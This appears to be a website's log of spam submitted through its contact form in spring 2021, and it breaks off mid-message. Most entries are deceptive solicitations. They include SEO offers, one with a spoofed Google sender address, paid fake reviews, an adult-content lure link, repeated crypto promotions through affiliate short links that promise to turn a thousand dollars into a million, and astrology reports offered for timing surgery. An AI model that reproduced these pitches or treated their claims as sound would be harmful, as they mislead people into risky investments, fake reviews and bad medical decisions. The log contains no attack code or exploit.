+++ 2021-03-23 08:58:07 AM -- Email from: Archie Tuggle, -- subject: cheap monthly SEO plans, -- email: archie.tuggle@gmail.com, -- Message is: Good Day

I have just checked esyray.com for its SEO metrics and seen that your website could use a push.

We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support.

Please check our plans here, we offer SEO at cheap rates.
https://digitalsy.org.uk/seo-pricing/

Start improving your sales and leads with us, today!

regards
Mike Tuggle
Digitalsy UK Team
support@digitalsy.org.uk
+++ 2021-03-23 06:29:42 PM -- Email from: Caster, -- subject: Rate My Wife's Nude Body, -- email: caster_world@gmail.com, -- Message is: Rate My Wife's Nude Body:  https://hot-girls-zone-here3.com/?u=wkmp60t&amp;o=qngk69a&amp;m=1
+++ 2021-03-25 09:28:54 AM -- Email from: Olivia Johnson, -- subject: Turn A Thousand Into A Million Via Cryptocurrencies, -- email: sidney.isom@gmail.com, -- Message is: Gd'Day Mate!

Firstly we are not selling anything.

Unless you have been living off the grid with no internet, the mainstream media has been reporting news on bitcoin and cryptocurrencies.

Tesla buys $1.5 billion in bitcoin, plans to accept it as payment
https://www.cnbc.com/2021/02/08/tesla-buys-1point5-billion-in-bitcoin.html

Weeks After $1B Bitcoin Purchase, MicroStrategy Buys Another $15M Worth Of Cryptocurrency
https://finance.yahoo.com/news/weeks-1b-bitcoin-purchase-microstrategy-163558608.html

If you are new to cryptocurrencies, our tip for you is NOT to buy Bitcoin now. There are literally thousands of cryptocurrencies, as with all things in life, some are gems (with potential to x10 or x100) and most are garbage which eventually will go to zero.

Bitcoin is the KING coin in the crypto world, all other crypto currencies are collectively known as altcoins.

What is altcoin season

While everyone has been focusin on Bitcoin, there is a term &quot;Altcoin Season&quot; when the prices of good altcoins can go up times 10 or even x 100 in a crazy rally. This is mainly due to speculators who have made crazy gains from Bitcoins to smaller cap coins in order to chase gains.

You can literally turn $1000 into $10,000 or even $100,000 in an altcoin season (which seems to be happening now).

After an altcoin rally which usually lasts 50 to 60 days, prices will crash hard (what goes up in a parabolic move must come down always).

And if you can turn $1000, into $10,000 during this altcoin rally which is happening soon, we advise you to rotate your profits into bitcoin (King coin) as Bitcoin becomes relatively &quot;cheap&quot; compared to altcoins until Nov this year.

You can likely turn $10,000 into $10000 in the next bitcoin run up until Nov 2021 (a repeat of what Bitcoin and the market did in the last bull run in 2017). History does not repeat exactly but history certainly rythmes!

And you have another chance to turn $10,000 into $1000,000 (thats 1 million) in the last leg of the altcoin rally which is likely to happen at the end of this year.

We understand there is no fundamentals to cryptos and this is a high risk game. But with the Federal Reserve holding down interest rates and printing more currencies (with the central banks around the world), the risk-reward for entering the crypto markets is simply too good.

Altcoins we recommend:

Zilliqa coin (ZIL) which you can buy in Binance (here -&gt; http://bit.ly/2L6ZySg)

ZIL coin is a project from Singapore, a country that is politically stable and widely known as a city that embraces Cryptocurrenies. The Central bank of Singapore has launched the Singapore Dollar as a crypto stable coin in Zilliaq blockchain.

https://www.mas.gov.sg/-/media/MAS/ProjectUbin/Project-Ubin-DvP-on-Distributed-Ledger-Technologies.pdf?la=en&amp;hash=2ADD9093B64A819FCC78D94E68FA008A6CD724FF

We believe you cannot go too wrong when you follow what the government of Singapore is pursuing. ZIL is currently trading around USD$0.20. You can buy ZIL coin in Binance, the world's biggest crypto currency exchange here: http://bit.ly/2L6ZySg


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg
+++ 2021-03-25 12:39:21 PM -- Email from: Ashley McNeel, -- subject: Important Reminder, -- email: ashely@thevoicedirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://thevoicedirectory.link/abcc1/?=esyray.com


Ashley
Voice Activation Follow-up Specialist
The Voice Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://thevoicedirectory.link/out.php?site=esyray.com
+++ 2021-03-25 03:27:51 PM -- Email from: Mike Donaldson, -- subject: quality monthly SEO plans, -- email: no-reply@google.com, -- Message is: Good Day 
 
I have just took a look on your SEO for  esyray.com for  the current search visibility and saw that your website could use a push. 
 
We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our plans here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start improving your sales and leads with us, today! 
 
regards 
Mike Donaldson
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-03-25 06:46:55 PM -- Email from: Olivia Johnson, -- subject: Turn A Thousand Into A Million Via Cryptocurrencies, -- email: mohamed.granados@hotmail.com, -- Message is: Gd'Day Mate!

Firstly we are not selling anything.

Unless you have been living off the grid with no internet, the mainstream media has been reporting news on bitcoin and cryptocurrencies.

Tesla buys $1.5 billion in bitcoin, plans to accept it as payment
https://www.cnbc.com/2021/02/08/tesla-buys-1point5-billion-in-bitcoin.html

Weeks After $1B Bitcoin Purchase, MicroStrategy Buys Another $15M Worth Of Cryptocurrency
https://finance.yahoo.com/news/weeks-1b-bitcoin-purchase-microstrategy-163558608.html

If you are new to cryptocurrencies, our tip for you is NOT to buy Bitcoin now. There are literally thousands of cryptocurrencies, as with all things in life, some are gems (with potential to x10 or x100) and most are garbage which eventually will go to zero.

Bitcoin is the KING coin in the crypto world, all other crypto currencies are collectively known as altcoins.

What is altcoin season

While everyone has been focusin on Bitcoin, there is a term &quot;Altcoin Season&quot; when the prices of good altcoins can go up times 10 or even x 100 in a crazy rally. This is mainly due to speculators who have made crazy gains from Bitcoins to smaller cap coins in order to chase gains.

You can literally turn $1000 into $10,000 or even $100,000 in an altcoin season (which seems to be happening now).

After an altcoin rally which usually lasts 50 to 60 days, prices will crash hard (what goes up in a parabolic move must come down always).

And if you can turn $1000, into $10,000 during this altcoin rally which is happening soon, we advise you to rotate your profits into bitcoin (King coin) as Bitcoin becomes relatively &quot;cheap&quot; compared to altcoins until Nov this year.

You can likely turn $10,000 into $10000 in the next bitcoin run up until Nov 2021 (a repeat of what Bitcoin and the market did in the last bull run in 2017). History does not repeat exactly but history certainly rythmes!

And you have another chance to turn $10,000 into $1000,000 (thats 1 million) in the last leg of the altcoin rally which is likely to happen at the end of this year.

We understand there is no fundamentals to cryptos and this is a high risk game. But with the Federal Reserve holding down interest rates and printing more currencies (with the central banks around the world), the risk-reward for entering the crypto markets is simply too good.

Altcoins we recommend:

Zilliqa coin (ZIL) which you can buy in Binance (here -&gt; http://bit.ly/2L6ZySg)

ZIL coin is a project from Singapore, a country that is politically stable and widely known as a city that embraces Cryptocurrenies. The Central bank of Singapore has launched the Singapore Dollar as a crypto stable coin in Zilliaq blockchain.

https://www.mas.gov.sg/-/media/MAS/ProjectUbin/Project-Ubin-DvP-on-Distributed-Ledger-Technologies.pdf?la=en&amp;hash=2ADD9093B64A819FCC78D94E68FA008A6CD724FF

We believe you cannot go too wrong when you follow what the government of Singapore is pursuing. ZIL is currently trading around USD$0.20. You can buy ZIL coin in Binance, the world's biggest crypto currency exchange here: http://bit.ly/2L6ZySg


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg
+++ 2021-03-25 09:36:03 PM -- Email from: Tina Coulter, -- subject: Your social signals for esyray.com, have arrived!, -- email: coulter.tina@gmail.com, -- Message is: Good evening - esyray.com,

Social Signals are a necessary element in modern SEO. Social signals will help websites improve rankings and increase organic traffic. In addition on the proven fact that search engines like google consider social signals, using a presence across multiple platforms helps strengthen your brand image. By creating and sharing social signals across Facebook, Google, Twitter, Pinterest, and multiple other networks, you improve your brand's sphere of influence. Having a good brand image will reflect on  your site's SEO.
Check what we can perform for you: 
https://iseo-shop.com/socialsignals
Best regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://iseo-shop.com/?unsubscribe=esyray.com
+++ 2021-03-26 08:42:56 AM -- Email from: Celesta Crain, -- subject: , -- email: crain.celesta@gmail.com, -- Message is: Get traffic for your online biz or &quot;brick and mortar&quot; shop without ever paying for ads. This post examines some cool online tools to use to get tons of free ads for your business: http://bit.ly/free-traffic-from-5-hi-traffic-sites
+++ 2021-03-26 07:22:22 PM -- Email from: Eric Jones, -- subject: Your site – more leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey, this is Eric and I ran across esyray.com a few minutes ago.

Looks great… but now what?

By that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?

Honestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.

Here’s an idea…
 
How about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…
 
You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

You’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.

It gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.
  
That way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Pretty sweet – AND effective.

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-03-27 05:40:14 PM -- Email from: Dulcie Skillen, -- subject: REPURPOSE - PUBLISH - PROFIT, -- email: skillen.dulcie@hotmail.com, -- Message is: Your All In One Solution For Creating All The Content You'll Ever Need.

Proprietary AI Turns YouTube Videos Into Traffic Getting Articles At The Press Of A Button!

We’ve Been Getting Free Autopilot Traffic From Google Without SEO Experience For Over 2 Years By Converting Others YouTube Videos Into Articles…

https://warriorplus.com/o2/a/gmvfs/0
+++ 2021-03-28 01:47:11 AM -- Email from: Sibyl Crick, -- subject: Romantic Compatibility, -- email: sales1@astrologicalstudio.com, -- Message is: Are you and your mate a good match? Find out with a Romantic Compatibility Report, your best resource for a romantic comparison. Recently called &quot;the best chart comparison report on the market&quot; by American Astrology magazine. Compares the charts of two individuals using the synastry, or inter-aspects. Includes a colorful bi-wheel chart with complete interpretations. What is it about them that's so appealing? Why do they make you laugh as no one else can? Do you have long-term potential? How can you help each other grow? Whether it's a new flirtation or a lifelong partnership, your stars light the way to a deeper understanding of yourself, your lover, and your relationship. Find out why astrology magazines calls it &quot;the best chart comparison report on the market.&quot; Discover your lover... Please visit our site https://astrologicalstudio.com for more information. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-03-28 03:52:08 PM -- Email from: Leona Romeo, -- subject: Need extra income?, -- email: romeo.leona61@gmail.com, -- Message is: Need extra income?

A fully hosted, done for you content + monetisation and a stunning design web based software that creates a fully automated done for you cryptocurrency affiliate site,

Visit us: https://warriorplus.com/o2/a/f5s4y/0
+++ 2021-03-29 04:37:38 PM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.bizvideo.link/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bizvideo.link/out.php/?site=esyray.com
+++ 2021-03-29 06:35:02 PM -- Email from: Olivia Johnson, -- subject: Everyone is buying Bitcoin - do not follow them, buy this instead, -- email: reinaldo.reyna@outlook.com, -- Message is: Gd'Day Mate!

In the crypto world, Binance is the biggest brand around and they offer an ecosystem of crypto services around their own cryptocurrency - the Binance coin (or BNB).

BNB powers the Binance Ecosystem and is the native coin of the Binance Chain and the Binance Smart Chain. BNB has several use cases:

Pay for trading fees on the Binance exchange;

Pay for trading fees on Binance DEX (Decentralized Exchange);

Pay for transaction fees on the Binance Chain;

Pay for transaction fees on the Binance Smart Chain;

Pay for goods and services for both online and in-store purchases (e.g., using Binance Card or Binance Pay);

Book hotels, flights and more at Travala.com;

Community utility token on the Binance Smart Chain ecosystem (such as games and DApps);

Participate in token sales hosted on the Binance Launchpad;

Donate on Binance Charity;

Provide liquidity on Binance Liquid Swap;



What is Binance Coin (BNB)?
BNB was launched through an Initial Coin Offering (or ICO) that took place from June 26th to July 3rd, 2017 - 11 days before the Binance Exchange opened for trading. The issue price was 1 ETH for 2,700 BNB or 1 BTC for 20,000 BNB.

BNB was issued as an ERC-20 token, running on the Ethereum network, with a total supply of 200 million coins. 100 million BNBs were offered in the ICO, but the current total supply is lower due to periodic burning events. If you want to know more about coin burns, and why BNBs are being permanently destroyed, check out What Is a Coin Burn?.

Although initially based on the Ethereum network, the ERC-20 BNB tokens were later swapped with BEP-2 BNB on a 1:1 ratio. The BEP-2 BNB is the native coin of the Binance Chain, and the mainnet launch was announced on April 18th, 2019.

In September 2020, Binance launched the Binance Smart Chain (BSC), which is a blockchain network that runs in parallel with the Binance Chain. This means that you can now find BNB in three different forms: 

BNB BEP-2 on the Binance Chain.

BNB BEP-20 on the Binance Smart Chain.

BNB ERC-20 on the Ethereum network.

What is BNB used for?
As mentioned, BNB has many use cases. For instance, you can use BNB to pay for your travel expenses, buy virtual gifts, and much more. But let’s take a look at how BNB can help you with trading fees. Here’s how to buy BNB right away! 

When trading on the Binance Exchange, each trade will incur a standard fee of 0.1% (trading fees are determined by your monthly trading volume and BNB holdings). You can either pay the trading fees using the assets you are trading or you can pay for them with BNB. If you choose to pay in BNB, you will get a special discount.

Therefore, if you trade a lot on Binance, you should consider getting BNB and using them to pay for your fees. Keep in mind that the deduction for trading fees follows a specific schedule, so make sure to check the current spot trading Fee Schedule. It's also worth noting that the Binance Futures platform follows a slightly different Fee Schedule.

Apart from discounted trading fees, BNB is also powering the Binance DEX (on the Binance Chain) and hundreds of applications that are running on the Binance Smart Chain (BSC).


Binance coin is trading at around $280 USD per coin at the time of writing this, we expect this to increase by another 100% at least in the next rally. Sign up at Binance using this link https://bit.ly/31uRnnb and get 10% off your trading fees when you use this link!


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
https://bit.ly/31uRnnb
+++ 2021-03-30 10:42:13 PM -- Email from: Benjamin Ehinger, -- subject: Website Content Writing Team, -- email: writingbyb@gmail.com, -- Message is: Hi! 
 
Do you struggle to find time to write articles? 
 
Hire the best team of writing online today! 
We do all the research and provide well-written SEO content perfect for higher ranking and better visitor engagement. 
 
If you need fresh articles for your blog or content marketing strategies, check out our current content specials here: 
 
https://writingbybenjamin.com/best-seo-articles/ 
 
We also offer product review writing here: 
 
https://writingbybenjamin.com/review-style-articles/ 
 
You can also contact me directly at WBB@writingbybenjamin.com
+++ 2021-03-31 04:51:49 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-03-31 08:58:16 PM -- Email from: Jett Marou, -- subject: Link Bypass, -- email: marou.jett@googlemail.com, -- Message is: What is Link Bypass?

Link Bypass allows you to easily bypass any sales page and generate a new buy link with no coding required and just a few clicks of your mouse.

How does Link Bypass work?

Step #1 - Choose any sales page you want to bypass and link bypass with automatically create a custom payment link

Step #2 - Add your new link to any landing page, sales page, or email with a few clicks of your mouse (Use your favorite page-building software or simply ‘copy and paste’)

Step #3 - Boost conversions and make more money on affiliate promotions

Visit us: https://warriorplus.com/o2/a/q8rmt/0
+++ 2021-04-01 12:52:52 PM -- Email from: Olivia Johnson, -- subject: Everyone is buying Bitcoin - do not follow them, buy this instead, -- email: jesus.goloubev45@googlemail.com, -- Message is: Gd'Day Mate!

In the crypto world, Binance is the biggest brand around and they offer an ecosystem of crypto services around their own cryptocurrency - the Binance coin (or BNB).

BNB powers the Binance Ecosystem and is the native coin of the Binance Chain and the Binance Smart Chain. BNB has several use cases:

Pay for trading fees on the Binance exchange;

Pay for trading fees on Binance DEX (Decentralized Exchange);

Pay for transaction fees on the Binance Chain;

Pay for transaction fees on the Binance Smart Chain;

Pay for goods and services for both online and in-store purchases (e.g., using Binance Card or Binance Pay);

Book hotels, flights and more at Travala.com;

Community utility token on the Binance Smart Chain ecosystem (such as games and DApps);

Participate in token sales hosted on the Binance Launchpad;

Donate on Binance Charity;

Provide liquidity on Binance Liquid Swap;



What is Binance Coin (BNB)?
BNB was launched through an Initial Coin Offering (or ICO) that took place from June 26th to July 3rd, 2017 - 11 days before the Binance Exchange opened for trading. The issue price was 1 ETH for 2,700 BNB or 1 BTC for 20,000 BNB.

BNB was issued as an ERC-20 token, running on the Ethereum network, with a total supply of 200 million coins. 100 million BNBs were offered in the ICO, but the current total supply is lower due to periodic burning events. If you want to know more about coin burns, and why BNBs are being permanently destroyed, check out What Is a Coin Burn?.

Although initially based on the Ethereum network, the ERC-20 BNB tokens were later swapped with BEP-2 BNB on a 1:1 ratio. The BEP-2 BNB is the native coin of the Binance Chain, and the mainnet launch was announced on April 18th, 2019.

In September 2020, Binance launched the Binance Smart Chain (BSC), which is a blockchain network that runs in parallel with the Binance Chain. This means that you can now find BNB in three different forms: 

BNB BEP-2 on the Binance Chain.

BNB BEP-20 on the Binance Smart Chain.

BNB ERC-20 on the Ethereum network.

What is BNB used for?
As mentioned, BNB has many use cases. For instance, you can use BNB to pay for your travel expenses, buy virtual gifts, and much more. But let’s take a look at how BNB can help you with trading fees. Here’s how to buy BNB right away! 

When trading on the Binance Exchange, each trade will incur a standard fee of 0.1% (trading fees are determined by your monthly trading volume and BNB holdings). You can either pay the trading fees using the assets you are trading or you can pay for them with BNB. If you choose to pay in BNB, you will get a special discount.

Therefore, if you trade a lot on Binance, you should consider getting BNB and using them to pay for your fees. Keep in mind that the deduction for trading fees follows a specific schedule, so make sure to check the current spot trading Fee Schedule. It's also worth noting that the Binance Futures platform follows a slightly different Fee Schedule.

Apart from discounted trading fees, BNB is also powering the Binance DEX (on the Binance Chain) and hundreds of applications that are running on the Binance Smart Chain (BSC).


Binance coin is trading at around $280 USD per coin at the time of writing this, we expect this to increase by another 100% at least in the next rally. Sign up at Binance using this link https://bit.ly/31uRnnb and get 10% off your trading fees when you use this link!


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
https://bit.ly/31uRnnb
+++ 2021-04-01 05:37:15 PM -- Email from: Jason Tull, -- subject: Get some Verified Facebook Page Reviews for esyray.com, -- email: tull.jason@gmail.com, -- Message is: Good evening,
I'm ,
How are you doing regarding your Facebook Page Reviews?
Facebook reviews expand your web exposure and local SEO. Since successful marketing tactics drive google’s algorithm, businesses with multiple reviews show up first in local searches.
Check what we can do for you: 
https://business-it-services.com/facebook-page-reviews
Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://business-it-services.com/?unsubscribe=esyray.com
+++ 2021-04-02 06:09:32 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-04-03 04:01:24 PM -- Email from: Olivia Johnson, -- subject: Everyone is buying Bitcoin - do not follow them, buy this instead, -- email: brigida.ducroz1@gmail.com, -- Message is: Gd'Day Mate!

In the crypto world, Binance is the biggest brand around and they offer an ecosystem of crypto services around their own cryptocurrency - the Binance coin (or BNB).

BNB powers the Binance Ecosystem and is the native coin of the Binance Chain and the Binance Smart Chain. BNB has several use cases:

Pay for trading fees on the Binance exchange;

Pay for trading fees on Binance DEX (Decentralized Exchange);

Pay for transaction fees on the Binance Chain;

Pay for transaction fees on the Binance Smart Chain;

Pay for goods and services for both online and in-store purchases (e.g., using Binance Card or Binance Pay);

Book hotels, flights and more at Travala.com;

Community utility token on the Binance Smart Chain ecosystem (such as games and DApps);

Participate in token sales hosted on the Binance Launchpad;

Donate on Binance Charity;

Provide liquidity on Binance Liquid Swap;



What is Binance Coin (BNB)?
BNB was launched through an Initial Coin Offering (or ICO) that took place from June 26th to July 3rd, 2017 - 11 days before the Binance Exchange opened for trading. The issue price was 1 ETH for 2,700 BNB or 1 BTC for 20,000 BNB.

BNB was issued as an ERC-20 token, running on the Ethereum network, with a total supply of 200 million coins. 100 million BNBs were offered in the ICO, but the current total supply is lower due to periodic burning events. If you want to know more about coin burns, and why BNBs are being permanently destroyed, check out What Is a Coin Burn?.

Although initially based on the Ethereum network, the ERC-20 BNB tokens were later swapped with BEP-2 BNB on a 1:1 ratio. The BEP-2 BNB is the native coin of the Binance Chain, and the mainnet launch was announced on April 18th, 2019.

In September 2020, Binance launched the Binance Smart Chain (BSC), which is a blockchain network that runs in parallel with the Binance Chain. This means that you can now find BNB in three different forms: 

BNB BEP-2 on the Binance Chain.

BNB BEP-20 on the Binance Smart Chain.

BNB ERC-20 on the Ethereum network.

What is BNB used for?
As mentioned, BNB has many use cases. For instance, you can use BNB to pay for your travel expenses, buy virtual gifts, and much more. But let’s take a look at how BNB can help you with trading fees. Here’s how to buy BNB right away! 

When trading on the Binance Exchange, each trade will incur a standard fee of 0.1% (trading fees are determined by your monthly trading volume and BNB holdings). You can either pay the trading fees using the assets you are trading or you can pay for them with BNB. If you choose to pay in BNB, you will get a special discount.

Therefore, if you trade a lot on Binance, you should consider getting BNB and using them to pay for your fees. Keep in mind that the deduction for trading fees follows a specific schedule, so make sure to check the current spot trading Fee Schedule. It's also worth noting that the Binance Futures platform follows a slightly different Fee Schedule.

Apart from discounted trading fees, BNB is also powering the Binance DEX (on the Binance Chain) and hundreds of applications that are running on the Binance Smart Chain (BSC).


Binance coin is trading at around $280 USD per coin at the time of writing this, we expect this to increase by another 100% at least in the next rally. Sign up at Binance using this link https://bit.ly/31uRnnb and get 10% off your trading fees when you use this link!


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
https://bit.ly/31uRnnb
+++ 2021-04-03 07:19:30 PM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE https://talkwithwebvisitors.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-04-04 09:51:35 AM -- Email from: Mora Godinez, -- subject: , -- email: godinez.mora@outlook.com, -- Message is: Learn how to promote your site absolutely free!

Take a look at this amazing list consisting of the hottest new website directories over here ::&gt;http://bit.ly/you-can-post-free-ads-here
+++ 2021-04-05 05:46:05 PM -- Email from: Mike Becker, -- subject: Increase sales for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Becker
 
support@monkeydigital.co 
Monkey Digital
+++ 2021-04-06 12:12:28 PM -- Email from: Olivia Johnson, -- subject: Hidden Secrets of Money - A Documentary That Will change Your Life, -- email: babb.mickey@msn.com, -- Message is: The Federal Reserve has been stimulating and stimulating the economy by printing more USD. Do you really understand how the monetary system works and how it affects you?

We are in extra-ordinary times and extraordinary times call for extraordinary measures. How do you ensure you stay on the right side of the upcoming wealth transfer from all the currency printing by central banks around the world?

Before you make any decision, we highly recommend you invest some of your time to watch and learn from this short series of documentary (designed for the average guy on the street) in youtube.

This is a video series called &quot;Hidden Secrets of Money&quot;
https://bit.ly/3sOxlQJ

This document will explain why it is important you own some physical gold, silver and bitcoin.

I have personally watched the entire series 3 times and it has changed the way I look at the entire monetary system. Protect your family by owning some physical gold, silver and bitcoin.

Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-06 05:16:23 PM -- Email from: Diego Grubb, -- subject: Do you want to know when is the best time to undergo your surgery or medical treatment?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Are you interested to know when the best time to undergo your surgery or medical treatment is? If so, we can prepare our Forecast of Events report for you, your loved ones, or friends. Our exclusive Forecast of Events reports contains this essential information, which can help you in this matter. In case of your interest, you can order these Forecast of Events reports at https://astrologicalstudio.com/home/23-1-year-forecast-of-events.html. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-04-08 06:43:58 PM -- Email from: Olivia Johnson, -- subject: Hidden Secrets of Money - A Documentary That Will change Your Life, -- email: manual.solly@gmail.com, -- Message is: The Federal Reserve has been stimulating and stimulating the economy by printing more USD. Do you really understand how the monetary system works and how it affects you?

We are in extra-ordinary times and extraordinary times call for extraordinary measures. How do you ensure you stay on the right side of the upcoming wealth transfer from all the currency printing by central banks around the world?

Before you make any decision, we highly recommend you invest some of your time to watch and learn from this short series of documentary (designed for the average guy on the street) in youtube.

This is a video series called &quot;Hidden Secrets of Money&quot;
https://bit.ly/3sOxlQJ

This document will explain why it is important you own some physical gold, silver and bitcoin.

I have personally watched the entire series 3 times and it has changed the way I look at the entire monetary system. Protect your family by owning some physical gold, silver and bitcoin.

Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-08 07:34:50 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

